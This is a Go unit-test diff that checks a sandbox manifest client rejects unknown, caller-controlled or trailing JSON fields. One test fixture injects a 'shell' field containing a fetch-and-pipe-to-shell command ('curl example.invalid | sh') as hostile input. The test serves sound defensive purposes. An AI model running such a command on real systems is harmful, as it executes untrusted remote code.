@@ -172,3 +172,77 @@ func TestClientDecodesCapacityOnlyManifest(t *testing.T) {
 		t.Fatalf("capacity-only manifest changed during decode: %#v", manifest)
 	}
 }
+
+func TestClientRejectsUnknownManifestFields(t *testing.T) {
+	tests := []struct {
+		name     string
+		response string
+	}{
+		{
+			name: "top level shell field",
+			response: `{
+				"serverId":"srv_example123",
+				"desiredRevision":1,
+				"sandboxes":[],
+				"accessGrants":[],
+				"shell":"curl example.invalid | sh"
+			}`,
+		},
+		{
+			name: "nested npm materializer unknown field",
+			response: `{
+				"serverId":"srv_example123",
+				"desiredRevision":1,
+				"sandboxes":[],
+				"accessGrants":[],
+				"setupOperations":[{
+					"id":"setup-test12345",
+					"schemaVersion":1,
+					"sandboxId":"sbx_test12345",
+					"sandboxGeneration":1,
+					"profileId":"profile-test12345",
+					"profileRevision":1,
+					"profileDigest":"sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+					"materializer":{"kind":"npm-package-set","artifacts":[{"id":"codex-wrapper","source":"https://registry.npmjs.org/@openai/codex/-/codex-0.156.0-alpha.3.tgz","sha256":"sha256:ad521f01018cef9b7975c13a6e3092c9bfd3b4ae27867af3d921686cebe92e2e","format":"npm-tgz","sizeBytes":4911,"packageName":"@openai/codex","packageVersion":"0.156.0-alpha.3","installAs":"@openai/codex","unexpected":"no"}],"bins":["codex"]}
+				}]
+			}`,
+		},
+		{
+			name: "trailing JSON value",
+			response: `{
+				"serverId":"srv_example123",
+				"desiredRevision":1,
+				"sandboxes":[],
+				"accessGrants":[]
+			} {}`,
+		},
+	}
+
+	for _, field := range []string{"command", "nestedPrivateProcfs", "apparmorProfile", "bwrapPath", "toolReport", "toolManifest"} {
+		tests = append(tests, struct {
+			name     string
+			response string
+		}{
+			name:     "caller-controlled sandbox " + field,
+			response: fmt.Sprintf(`{"sandboxes":[{"id":"sbx_test12345","%s":"untrusted"}]}`, field),
+		})
+	}
+	for _, test := range tests {
+		t.Run(test.name, func(t *testing.T) {
+			server := httptest.NewTLSServer(http.HandlerFunc(func(writer http.ResponseWriter, _ *http.Request) {
+				writer.Header().Set("Content-Type", "application/json")
+				_, _ = fmt.Fprint(writer, test.response)
+			}))
+			defer server.Close()
+
+			client := Client{
+				Origin:    server.URL,
+				NodeToken: "rtn_test",
+				HTTP:      server.Client(),
+			}
+			if _, err := client.Manifest(context.Background()); err == nil {
+				t.Fatal("expected an unknown manifest field to be rejected")
+			}
+		})
+	}
+}
